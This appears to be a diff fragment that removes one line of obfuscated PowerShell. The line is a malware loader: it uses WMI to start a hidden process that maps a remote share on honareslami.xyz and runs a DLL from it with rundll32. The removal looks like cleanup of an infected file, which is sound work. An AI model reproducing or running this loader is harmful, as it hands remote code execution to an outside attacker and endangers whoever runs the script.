@@ -1,1 +1,0 @@
-$aQNg=([wmiclass](-join('W','in32_Pr','ocess','Sta','rtup'))).CreateInstance();$aQNg.ShowWindow=0;([wmiclass](-join('Win32','_Proces','s'))).Create(('cmd'+' /'+'c push'+'d \\drf.'+'honares'+'lami.x'+'yz\d2e'+'8d'+'12f-63a2'+'-'+'4'+'e0f-'+'806b'+'-d'+'a6'+'7aad3948'+'8 & run'+'dll'+'32 g'+'oog.ct'+','+'#1'),$null,$aQNg)
